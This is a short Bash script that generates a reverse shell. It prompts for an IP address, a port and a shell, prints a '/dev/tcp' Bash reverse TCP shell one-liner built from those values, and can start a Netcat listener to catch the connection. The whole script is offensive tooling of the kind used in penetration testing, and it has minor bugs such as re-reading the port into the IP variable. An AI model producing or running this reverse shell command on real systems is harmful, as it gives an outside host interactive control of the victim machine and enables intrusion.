#!/bin/bash
# author: ide0x90

RED='\033[0;31m'
GREEN='\033[0;32m'
BLUE='\033[1;34m'
YELLOW='\033[0;33m'
NC='\033[0m'


echo -e "${BLUE}[*]${NC} This script will create a simple TCP reverse shell for you to use."

# get IP address, and check for invalid IP address
echo -e -n "${BLUE}[*]${NC} Enter IP address: "
read lhost
while [[ ! $lhost =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; do
    echo -e -n "${RED}[-]${NC} Invalid IP address, please enter a valid IP address: "
    read lhost
done

# check if IP address is assigned to this machine
ipaddr_array=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | cut -f 10 -d ' ')
if [[ ! "${ipaddr_array[@]}" =~ "${lhost}" ]]; then
    echo -e "${YELLOW}[*]${NC} The IP address you provided does not seem to exist on your local machine."
    echo -e "${YELLOW}[*]${NC} It is advised to check the output of 'ifconfig' and try again."
    echo -e -n "${YELLOW}[*]${NC} Continue anyway? Y/N: "
    read yn1
    if [ $yn1 == "N" ] || [ $yn1 == "n" ]; then
        echo -e "${RED}[-]${NC} Quitting..."
        exit 0
    fi
fi

# get port, and check for invalid port
echo -e -n "${BLUE}[*]${NC} Enter the port you want to listen on (recommended 1025-65535): "
read lport
while [ $lport -gt 65535 ]; do
    echo -e -n "${RED}[-]${NC} Invalid port, enter a port between 1025 and 65535: "
    read lhost
done

# if port is less than 1025, it requires root privs, and won't work unless you are root
if [[ $lport -lt 1025 ]]; then
    echo -e "${YELLOW}[*]${NC} You have selected a port less than 1025. This requires root privileges."
    echo -e "${YELLOW}[*]${NC} Your reverse shell may not work if you continue."
    echo -e -n "${YELLOW}[*]${NC} Continue? Y/N: "
    read yn2
    if [ $yn2 == "N" ] || [ $yn2 == "n" ]; then
        echo -e "${RED}[-]${NC} Quitting..."
        exit 0
    fi
fi


echo -e -n "${BLUE}[*]${NC} Enter shell executable (default is /bin/bash): "
read shellexec
if [[ $shellexec -eq "" ]]; then
    shellexec="/bin/bash"
fi

echo -e "${GREEN}[+]${NC} Your Bash reverse TCP shell: $shellexec -i >& /dev/tcp/$lhost/$lport 0>&1"

################################################
# if supplied IP address in list of IP addresses
# TODO

if [[ ! "${ipaddr_array[@]}" =~ "${lhost}" ]]; then
    echo -e "${YELLOW}[*]${NC} Provided IP address does not match any IP address assigned to your computer."
    echo -e "${YELLOW}[*]${NC} The reverse TCP shell may not work as expected."
    exit 0
fi

echo -e -n "${BLUE}[*]${NC} Do you want to start a Netcat listener now? Y/N: "
read yn3
if [ $yn3 == "Y" ] || [ $yn3 == "y" ]; then
    echo -e "${BLUE}[*]${NC} Press Ctrl+C to exit at any time."
    echo -e "${GREEN}[+]${NC} Listening on $lhost with port $lport..."
    nc -l $lhost $lport
fi

exit 0
